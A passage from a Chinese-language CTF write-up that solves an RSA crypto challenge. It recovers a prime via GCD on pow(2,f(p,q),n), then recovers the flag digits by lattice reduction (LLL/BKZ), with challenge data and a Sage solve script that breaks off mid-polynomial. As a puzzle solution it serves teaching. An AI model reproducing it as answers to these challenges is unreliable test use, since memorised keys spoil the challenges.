2*x^23*y^2 - x^21*y^4 + x^17*y^8 + 2*x^16*y^9 - x^15*y^10 - 2*x^14*y^11 - x^13*y^12 + 2*x^12*y^13 - 2*x^11*y^14 - x^9*y^16 - x^8*y^17 - x^6*y^19 - x^5*y^20 + x^4*y^21 + x^3*y^22 + 5*x*y^24 - 2*y^25 - x^24 + 2*x^23*y + x^22*y^2 - x^21*y^3 - x^19*y^5 + x^18*y^6 - x^17*y^7 + 2*x^16*y^8 - 4*x^15*y^9 - x^14*y^10 - x^13*y^11 - x^12*y^12 + 4*x^10*y^14 + 2*x^9*y^15 - x^8*y^16 - 2*x^7*y^17 - 2*x^6*y^18 + 4*x^5*y^19 + x^4*y^20 + 2*x^2*y^22 - 5*x*y^23 - y^24 + x^23 - x^22*y + 2*x^21*y^2 - x^20*y^3 - x^18*y^5 - x^17*y^6 - 5*x^15*y^8 + x^14*y^9 - 3*x^13*y^10 + 3*x^12*y^11 + 2*x^11*y^12 - 2*x^10*y^13 - 2*x^9*y^14 - x^8*y^15 + 2*x^7*y^16 - 2*x^6*y^17 - 4*x^5*y^18 - 5*x^3*y^20 - x^2*y^21 - x*y^22 - 4*y^23 - x^22 + 2*x^21*y - 2*x^20*y^2 - 2*x^19*y^3 - 3*x^17*y^5 - x^16*y^6 - x^15*y^7 + 4*x^13*y^9 + 2*x^12*y^10 + 3*x^11*y^11 + 2*x^10*y^12 - x^9*y^13 - x^7*y^15 + 2*x^6*y^16 + x^3*y^19 + 2*x^2*y^20 + 2*x*y^21 + 3*y^22 - 3*x^21 - x^20*y - x^19*y^2 + 2*x^17*y^4 - x^16*y^5 - x^15*y^6 + x^14*y^7 - 5*x^12*y^9 - 2*x^11*y^10 + x^10*y^11 + x^6*y^15 + x^5*y^16 + x^4*y^17 - 3*x^2*y^19 - 2*x*y^20 - 2*y^21 + x^20 + 2*x^19*y - 2*x^17*y^3 + 2*x^16*y^4 - 3*x^15*y^5 + 4*x^14*y^6 + 2*x^13*y^7 - x^12*y^8 - 2*x^11*y^9 + x^10*y^10 + 6*x^9*y^11 + x^8*y^12 + x^7*y^13 + 2*x^5*y^15 + 4*x^4*y^16 + x^3*y^17 - x^2*y^18 + 3*x*y^19 - x^17*y^2 + 2*x^16*y^3 + 3*x^14*y^5 - x^13*y^6 + 2*x^11*y^8 + x^10*y^9 + 3*x^9*y^10 - x^7*y^12 - x^6*y^13 + 3*x^5*y^14 - 4*x^4*y^15 + x^2*y^17 + 2*y^19 - x^18 - x^16*y^2 - 2*x^14*y^4 - 2*x^13*y^5 - 2*x^12*y^6 + 2*x^11*y^7 + 3*x^9*y^9 + 3*x^8*y^10 + x^6*y^12 - x^4*y^14 + 2*x^3*y^15 + 2*x^2*y^16 - 2*x*y^17 - x^17 - 4*x^16*y - 2*x^15*y^2 + 2*x^14*y^3 - x^13*y^4 + x^12*y^5 - 2*x^11*y^6 - 3*x^10*y^7 - x^9*y^8 - 5*x^8*y^9 + 2*x^7*y^10 + 2*x^6*y^11 - x^5*y^12 + x^4*y^13 - 3*x^2*y^15 + x*y^16 - 3*x^16 + x^15*y - 3*x^14*y^2 - x^13*y^3 - x^12*y^4 + 2*x^11*y^5 - x^10*y^6 + 5*x^8*y^8 + 3*x^7*y^9 + 3*x^6*y^10 + 2*x^5*y^11 + 4*x^4*y^12 + 2*x^3*y^13 + x^2*y^14 - 3*x*y^15 - x^15 + 3*x^14*y + x^13*y^2 - x^12*y^3 - 3*x^11*y^4 + x^10*y^5 - x^9*y^6 + 2*x^8*y^7 - x^7*y^8 + 4*x^5*y^10 - 2*x^4*y^11 + x^3*y^12 - x^14 + x^13*y + 2*x^12*y^2 + x^11*y^3 - 5*x^10*y^4 - x^9*y^5 - 3*x^8*y^6 - 2*x^7*y^7 + x^6*y^8 + 3*x^5*y^9 + x^4*y^10 + 2*x^3*y^11 - x^2*y^12 - 4*x*y^13 + 3*y^14 + x^12*y - 2*x^11*y^2 - x^9*y^4 - x^8*y^5 + 5*x^7*y^6 - 4*x^6*y^7 + 3*x^5*y^8 + 4*x^4*y^9 - 3*x^3*y^10 - x^2*y^11 - 2*x*y^12 - 3*y^13 + 3*x^12 + x^11*y + x^10*y^2 + x^9*y^3 + x^8*y^4 - x^6*y^6 - x^5*y^7 - 4*x^3*y^9 - x^2*y^10 - 3*x*y^11 - 2*y^12 + x^10*y + 5*x^9*y^2 + x^8*y^3 + 3*x^5*y^6 + x^4*y^7 + 2*x^3*y^8 - 4*x^2*y^9 + 2*x*y^10 + 3*y^11 - x^10 - 2*x^9*y - 2*x^7*y^3 - x^6*y^4 + x^5*y^5 + 3*x^4*y^6 - 2*x^2*y^8 - x*y^9 + 4*x^9 - 3*x^8*y - 3*x^6*y^3 + x^5*y^4 - x^4*y^5 - 2*x^3*y^6 - 2*x^2*y^7 + x*y^8 + 4*y^9 + 2*x^8 - x^7*y - 2*x^5*y^3 - 4*x^4*y^4 + 3*x^3*y^5 + 4*x^2*y^6 + 2*x*y^7 - 2*y^8 + 2*x^7 + 3*x^5*y^2 + 3*x^2*y^5 - x*y^6 - 4*x^6 + 6*x^3*y^3 + 2*x^2*y^4 - 2*x*y^5 - 3*y^6 + x^5 - 3*x^4*y + x^3*y^2 + x^2*y^3 - 2*x*y^4 + 2*x^4 - 2*x^3*y + 6*x^2*y^2 - 3*x*y^3 - 2*y^4 - 5*x^3 - 2*x^2*y - 2*x*y^2 + 3*y^3 + 2*x^2 - x*y + y^2 - 2*x + 2*y - 2</span></span><br><span class="line"><span class="string">w = 12796020294902567574981427270787776254781813995526831579805652479456168245098217943847166109912113827479436654134179666391771173421469188197935460525521295192736123648410762964187396897298542198935971755852754544978564521188423737649175136194386664628304164316905741781089536713701674793641345344818309314224</span></span><br><span class="line"><span class="string">c = 10266913434526071998707605266130137733134248608585146234981245806763995653822203763396430876254213500327272952979577138542487120755771047170064775346450942</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>emmm，怎么说呢，去<strong>github</strong>搜了一下<strong>pow(2,f(p,q),n)</strong>，真给我找到了(注意看，五天前)<br><img src="https://picx.zhimg.com/80/v2-42436e9a39d3de9fa72f9af9ef543381_1440w.png" alt=""><br>看过程，就<strong>GCD求出p</strong>是一样的，求<code>flag</code>还得自己想办法<br>之后就是顺藤摸瓜环节了，所以这题可以参考<code>ictf</code>月赛(应该是月赛吧)的<code>wp</code>，具体原理还没研究</p><p>(突然间有一个想法，让小凳刷刷这里月赛的题，虽然<code>wp</code>给的是<code>exp</code>，应该能学到点东西的吧？好像国内就没有这种形式的比赛，不像<code>cf</code>那样)</p><p><a href="https://imaginaryctf.org/ArchivedChallenges">https://imaginaryctf.org/ArchivedChallenges</a><br><strong>Archived Challenges - February 2025 - Crypto - bivariate (110pts) - 10/02</strong></p><p>有意思的是，这题的前一题也是弱化版，跟上面的<strong>EZ_Fermat</strong>一样</p><p>小改一下参数，求出<code>p</code>之后卡了好久，80位的数字也太长了，并没有可行的思路，网上直接找，也找不到有用的参考</p><p>然后到了晚上就想起了<strong>羊城杯2024</strong>的一道题目<strong>rsa-loss</strong>，只能说比较类似，改了一下发现还是跑不出结果，因为脚本其实还是<strong>bcactf-4.0原题rsa_is_broken</strong>的脚本</p><p>半个多小时后，我又有想法了，会不会还有别的解题思路，一搜<strong>羊城杯2024rsa-loss</strong>，跳出一篇<code>csdn</code>的博客，<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/141638136">https://blog.csdn.net/XiongSiqi_blog/article/details/141638136</a></p><p>发现这位师傅套用的还是糖醋小鸡块师傅的脚本，再次<a href="https://tangcuxiaojikuai.xyz/post/94c7e291.html">跳转</a><br><img src="https://picx.zhimg.com/80/v2-8b39516006a4e7434a581a17a06427fd_1440w.png" alt=""></p><p>专研一下师傅的思路，发现还是构造格，我之前也有构造格的想法(主要原因是我们已知<strong>flag的长度</strong>，而且可以从<strong>字节串转换为整型</strong>入手，$\ sum(a_{i}<em>255^{i})罢了$)，然后发现目标向量的数量级差距有点大，直接根据题目构造出来的格的话出来的目标向量是<em>*ASCII为48到57</em></em>，跟后面的1，0组成</p><p>所以得优化一下，弄成$t_{i}=a_{i}-48$，结果$t_{i}$就都是0-9这样的短向量了，规约出来的机会大得多，同时呢，我们的<code>c</code>也要进行处理</p><p>因为我们的$a_{i}\in [0,9]$，平均值会在4/5这样，需要给倒数第二列配4/5，<strong>使目标向量中值的数量级更加接近</strong></p><p>然后，我就用<strong>LLL算法</strong>进行<strong>格规约</strong>了，可以看到<strong>小鸡块师傅</strong>用的是<strong>BKZ算法</strong>(<strong>规约能力更强</strong>)，并且给格的<strong>最后一列</strong>配上了个<strong>大系数</strong>(至于多大，一般得自行测试调整)使得能规约出目标向量中的0，我一开始没用到，结果就是一位之差，最后还是加上了<br><img src="https://picx.zhimg.com/80/v2-f2f550ed8174549011cf7074e302cbc0_1440w.png" alt=""><br>可见，<strong>优化处理</strong>还是非常必要的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">P.&lt;x,y&gt; = ZZ[]</span><br><span class="line">n = <span class="number">95656952327201449381426394713246214670537600365883923624876350719801926817916514429721785287844335184715049179879891389941974481490433975689601829920289485889138252888029716516069912637121531561601839948367426922036690701168975937162280451323099126372019216020898338909808577022618554997063496690156977790629</span></span><br><span class="line">f = x^<span class="number">31</span> - x^<span class="number">30</span>*y - <span class="number">2</span>*x^<span class="number">29</span>*y^<span class="number">2</span> + <span class="number">7</span>*x^<span class="number">28</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">27</span>*y^<span class="number">4</span> - <span class="number">4</span>*x^<span class="number">24</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">23</span>*y^<span class="number">8</span> - x^<span class="number">20</span>*y^<span class="number">11</span> - <span class="number">4</span>*x^<span class="number">19</span>*y^<span class="number">12</span> + x^<span class="number">18</span>*y^<span class="number">13</span> - <span class="number">5</span>*x^<span class="number">17</span>*y^<span class="number">14</span> - <span class="number">4</span>*x^<span class="number">16</span>*y^<span class="number">15</span> - x^<span class="number">15</span>*y^<span class="number">16</span> + x^<span class="number">14</span>*y^<span class="number">17</span> + x^<span class="number">13</span>*y^<span class="number">18</span> + x^<span class="number">12</span>*y^<span class="number">19</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">20</span> - <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">22</span> + <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">24</span> + x^<span class="number">6</span>*y^<span class="number">25</span> + <span class="number">6</span>*x^<span class="number">4</span>*y^<span class="number">27</span> + x^<span class="number">3</span>*y^<span class="number">28</span> + <span class="number">2</span>*x*y^<span class="number">30</span> + y^<span class="number">31</span> - <span class="number">2</span>*x^<span class="number">30</span> - <span class="number">3</span>*x^<span class="number">29</span>*y + <span class="number">2</span>*x^<span class="number">28</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">27</span>*y^<span class="number">3</span> - x^<span class="number">26</span>*y^<span class="number">4</span> - x^<span class="number">25</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">23</span>*y^<span class="number">7</span> - <span class="number">3</span>*x^<span class="number">22</span>*y^<span class="number">8</span> - <span class="number">3</span>*x^<span class="number">20</span>*y^<span class="number">10</span> - <span class="number">4</span>*x^<span class="number">19</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">12</span> + x^<span class="number">15</span>*y^<span class="number">15</span> - x^<span class="number">14</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">18</span> - <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">19</span> - x^<span class="number">10</span>*y^<span class="number">20</span> + x^<span class="number">9</span>*y^<span class="number">21</span> + <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">22</span> + x^<span class="number">7</span>*y^<span class="number">23</span> + x^<span class="number">5</span>*y^<span class="number">25</span> - x^<span class="number">4</span>*y^<span class="number">26</span> - <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">27</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">28</span> - y^<span class="number">30</span> - <span class="number">2</span>*x^<span class="number">29</span> - x^<span class="number">28</span>*y + <span class="number">3</span>*x^<span class="number">26</span>*y^<span class="number">3</span> - x^<span class="number">25</span>*y^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">5</span> + x^<span class="number">23</span>*y^<span class="number">6</span> - x^<span class="number">22</span>*y^<span class="number">7</span> - x^<span class="number">20</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">19</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">11</span> + x^<span class="number">16</span>*y^<span class="number">13</span> + x^<span class="number">15</span>*y^<span class="number">14</span> + x^<span class="number">14</span>*y^<span class="number">15</span> + x^<span class="number">13</span>*y^<span class="number">16</span> + x^<span class="number">12</span>*y^<span class="number">17</span> + <span class="number">5</span>*x^<span class="number">11</span>*y^<span class="number">18</span> - x^<span class="number">9</span>*y^<span class="number">20</span> - <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">21</span> - <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">22</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">23</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">24</span> - <span class="number">5</span>*x^<span class="number">3</span>*y^<span class="number">26</span> - x^<span class="number">2</span>*y^<span class="number">27</span> + <span class="number">2</span>*x*y^<span class="number">28</span> - y^<span class="number">29</span> + <span class="number">3</span>*x^<span class="number">28</span> + <span class="number">3</span>*x^<span class="number">27</span>*y - <span class="number">2</span>*x^<span class="number">26</span>*y^<span class="number">2</span> + x^<span class="number">25</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">4</span> - x^<span class="number">23</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">22</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">20</span>*y^<span class="number">8</span> - <span class="number">3</span>*x^<span class="number">19</span>*y^<span class="number">9</span> + <span class="number">4</span>*x^<span class="number">17</span>*y^<span class="number">11</span> - x^<span class="number">16</span>*y^<span class="number">12</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">14</span> + x^<span class="number">13</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">17</span> + x^<span class="number">10</span>*y^<span class="number">18</span> - <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">19</span> + x^<span class="number">8</span>*y^<span class="number">20</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">21</span> - x^<span class="number">6</span>*y^<span class="number">22</span> + x^<span class="number">5</span>*y^<span class="number">23</span> - x^<span class="number">4</span>*y^<span class="number">24</span> + x^<span class="number">3</span>*y^<span class="number">25</span> + x^<span class="number">2</span>*y^<span class="number">26</span> - x*y^<span class="number">27</span> - y^<span class="number">28</span> + x^<span class="number">27</span> + x^<span class="number">26</span>*y - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">3</span> + x^<span class="number">23</span>*y^<span class="number">4</span> - <span class="number">3</span>*x^<span class="number">22</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">21</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">20</span>*y^<span class="number">7</span> - <span class="number">5</span>*x^<span class="number">19</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">9</span> - <span class="number">5</span>*x^<span class="number">17</span>*y^<span class="number">10</span> + x^<span class="number">16</span>*y^<span class="number">11</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">12</span> - <span class="number">4</span>*x^<span class="number">14</span>*y^<span class="number">13</span> - x^<span class="number">13</span>*y^<span class="number">14</span> + x^<span class="number">12</span>*y^<span class="number">15</span> + <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">16</span> + <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">9</span>*y^<span class="number">18</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">21</span> + x^<span class="number">5</span>*y^<span class="number">22</span> + <span class="number">4</span>*x^<span class="number">3</span>*y^<span class="number">24</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">25</span> + <span class="number">2</span>*x*y^<span class="number">26</span> - <span class="number">2</span>*y^<span class="number">27</span> + x^<span class="number">25</span>*y + x^<span class="number">24</span>*y^<span class="number">2</span> + x^<span class="number">23</span>*y^<span class="number">3</span> + <span class="number">5</span>*x^<span class="number">22</span>*y^<span class="number">4</span> + x^<span class="number">20</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">19</span>*y^<span class="number">7</span> + x^<span class="number">18</span>*y^<span class="number">8</span> - x^<span class="number">17</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">15</span>*y^<span class="number">11</span> - x^<span class="number">14</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">13</span> - x^<span class="number">12</span>*y^<span class="number">14</span> + <span class="number">4</span>*x^<span class="number">11</span>*y^<span class="number">15</span> - x^<span class="number">10</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">20</span> - x^<span class="number">5</span>*y^<span class="number">21</span> + <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">23</span> + x^<span class="number">2</span>*y^<span class="number">24</span> - <span class="number">3</span>*x*y^<span class="number">25</span> - <span class="number">3</span>*y^<span class="number">26</span> + <span class="number">3</span>*x^<span class="number">25</span> - <span class="number">2</span>*x^<span class="number">23</span>*y^<span class="number">2</span> - x^<span class="number">21</span>*y^<span class="number">4</span> + x^<span class="number">17</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">9</span> - x^<span class="number">15</span>*y^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">11</span> - x^<span class="number">13</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">14</span> - x^<span class="number">9</span>*y^<span class="number">16</span> - x^<span class="number">8</span>*y^<span class="number">17</span> - x^<span class="number">6</span>*y^<span class="number">19</span> - x^<span class="number">5</span>*y^<span class="number">20</span> + x^<span class="number">4</span>*y^<span class="number">21</span> + x^<span class="number">3</span>*y^<span class="number">22</span> + <span class="number">5</span>*x*y^<span class="number">24</span> - <span class="number">2</span>*y^<span class="number">25</span> - x^<span class="number">24</span> + <span class="number">2</span>*x^<span class="number">23</span>*y + x^<span class="number">22</span>*y^<span class="number">2</span> - x^<span class="number">21</span>*y^<span class="number">3</span> - x^<span class="number">19</span>*y^<span class="number">5</span> + x^<span class="number">18</span>*y^<span class="number">6</span> - x^<span class="number">17</span>*y^<span class="number">7</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">15</span>*y^<span class="number">9</span> - x^<span class="number">14</span>*y^<span class="number">10</span> - x^<span class="number">13</span>*y^<span class="number">11</span> - x^<span class="number">12</span>*y^<span class="number">12</span> + <span class="number">4</span>*x^<span class="number">10</span>*y^<span class="number">14</span> + <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">15</span> - x^<span class="number">8</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">17</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">18</span> + <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">19</span> + x^<span class="number">4</span>*y^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">22</span> - <span class="number">5</span>*x*y^<span class="number">23</span> - y^<span class="number">24</span> + x^<span class="number">23</span> - x^<span class="number">22</span>*y + <span class="number">2</span>*x^<span class="number">21</span>*y^<span class="number">2</span> - x^<span class="number">20</span>*y^<span class="number">3</span> - x^<span class="number">18</span>*y^<span class="number">5</span> - x^<span class="number">17</span>*y^<span class="number">6</span> - <span class="number">5</span>*x^<span class="number">15</span>*y^<span class="number">8</span> + x^<span class="number">14</span>*y^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">13</span>*y^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">12</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">12</span> - <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">14</span> - x^<span class="number">8</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">18</span> - <span class="number">5</span>*x^<span class="number">3</span>*y^<span class="number">20</span> - x^<span class="number">2</span>*y^<span class="number">21</span> - x*y^<span class="number">22</span> - <span class="number">4</span>*y^<span class="number">23</span> - x^<span class="number">22</span> + <span class="number">2</span>*x^<span class="number">21</span>*y - <span class="number">2</span>*x^<span class="number">20</span>*y^<span class="number">2</span> - <span class="number">2</span>*x^<span class="number">19</span>*y^<span class="number">3</span> - <span class="number">3</span>*x^<span class="number">17</span>*y^<span class="number">5</span> - x^<span class="number">16</span>*y^<span class="number">6</span> - x^<span class="number">15</span>*y^<span class="number">7</span> + <span class="number">4</span>*x^<span class="number">13</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">12</span> - x^<span class="number">9</span>*y^<span class="number">13</span> - x^<span class="number">7</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">16</span> + x^<span class="number">3</span>*y^<span class="number">19</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">20</span> + <span class="number">2</span>*x*y^<span class="number">21</span> + <span class="number">3</span>*y^<span class="number">22</span> - <span class="number">3</span>*x^<span class="number">21</span> - x^<span class="number">20</span>*y - x^<span class="number">19</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">17</span>*y^<span class="number">4</span> - x^<span class="number">16</span>*y^<span class="number">5</span> - x^<span class="number">15</span>*y^<span class="number">6</span> + x^<span class="number">14</span>*y^<span class="number">7</span> - <span class="number">5</span>*x^<span class="number">12</span>*y^<span class="number">9</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">10</span> + x^<span class="number">10</span>*y^<span class="number">11</span> + x^<span class="number">6</span>*y^<span class="number">15</span> + x^<span class="number">5</span>*y^<span class="number">16</span> + x^<span class="number">4</span>*y^<span class="number">17</span> - <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">19</span> - <span class="number">2</span>*x*y^<span class="number">20</span> - <span class="number">2</span>*y^<span class="number">21</span> + x^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">19</span>*y - <span class="number">2</span>*x^<span class="number">17</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">4</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">5</span> + <span class="number">4</span>*x^<span class="number">14</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">7</span> - x^<span class="number">12</span>*y^<span class="number">8</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">9</span> + x^<span class="number">10</span>*y^<span class="number">10</span> + <span class="number">6</span>*x^<span class="number">9</span>*y^<span class="number">11</span> + x^<span class="number">8</span>*y^<span class="number">12</span> + x^<span class="number">7</span>*y^<span class="number">13</span> + <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">15</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">16</span> + x^<span class="number">3</span>*y^<span class="number">17</span> - x^<span class="number">2</span>*y^<span class="number">18</span> + <span class="number">3</span>*x*y^<span class="number">19</span> - x^<span class="number">17</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">3</span> + <span class="number">3</span>*x^<span class="number">14</span>*y^<span class="number">5</span> - x^<span class="number">13</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">8</span> + x^<span class="number">10</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">10</span> - x^<span class="number">7</span>*y^<span class="number">12</span> - x^<span class="number">6</span>*y^<span class="number">13</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">14</span> - <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">15</span> + x^<span class="number">2</span>*y^<span class="number">17</span> + <span class="number">2</span>*y^<span class="number">19</span> - x^<span class="number">18</span> - x^<span class="number">16</span>*y^<span class="number">2</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">8</span>*y^<span class="number">10</span> + x^<span class="number">6</span>*y^<span class="number">12</span> - x^<span class="number">4</span>*y^<span class="number">14</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">16</span> - <span class="number">2</span>*x*y^<span class="number">17</span> - x^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">16</span>*y - <span class="number">2</span>*x^<span class="number">15</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">3</span> - x^<span class="number">13</span>*y^<span class="number">4</span> + x^<span class="number">12</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">10</span>*y^<span class="number">7</span> - x^<span class="number">9</span>*y^<span class="number">8</span> - <span class="number">5</span>*x^<span class="number">8</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">11</span> - x^<span class="number">5</span>*y^<span class="number">12</span> + x^<span class="number">4</span>*y^<span class="number">13</span> - <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">15</span> + x*y^<span class="number">16</span> - <span class="number">3</span>*x^<span class="number">16</span> + x^<span class="number">15</span>*y - <span class="number">3</span>*x^<span class="number">14</span>*y^<span class="number">2</span> - x^<span class="number">13</span>*y^<span class="number">3</span> - x^<span class="number">12</span>*y^<span class="number">4</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">5</span> - x^<span class="number">10</span>*y^<span class="number">6</span> + <span class="number">5</span>*x^<span class="number">8</span>*y^<span class="number">8</span> + <span class="number">3</span>*x^<span class="number">7</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">6</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">11</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">13</span> + x^<span class="number">2</span>*y^<span class="number">14</span> - <span class="number">3</span>*x*y^<span class="number">15</span> - x^<span class="number">15</span> + <span class="number">3</span>*x^<span class="number">14</span>*y + x^<span class="number">13</span>*y^<span class="number">2</span> - x^<span class="number">12</span>*y^<span class="number">3</span> - <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">4</span> + x^<span class="number">10</span>*y^<span class="number">5</span> - x^<span class="number">9</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">7</span> - x^<span class="number">7</span>*y^<span class="number">8</span> + <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">4</span>*y^<span class="number">11</span> + x^<span class="number">3</span>*y^<span class="number">12</span> - x^<span class="number">14</span> + x^<span class="number">13</span>*y + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">2</span> + x^<span class="number">11</span>*y^<span class="number">3</span> - <span class="number">5</span>*x^<span class="number">10</span>*y^<span class="number">4</span> - x^<span class="number">9</span>*y^<span class="number">5</span> - <span class="number">3</span>*x^<span class="number">8</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">7</span> + x^<span class="number">6</span>*y^<span class="number">8</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">9</span> + x^<span class="number">4</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">11</span> - x^<span class="number">2</span>*y^<span class="number">12</span> - <span 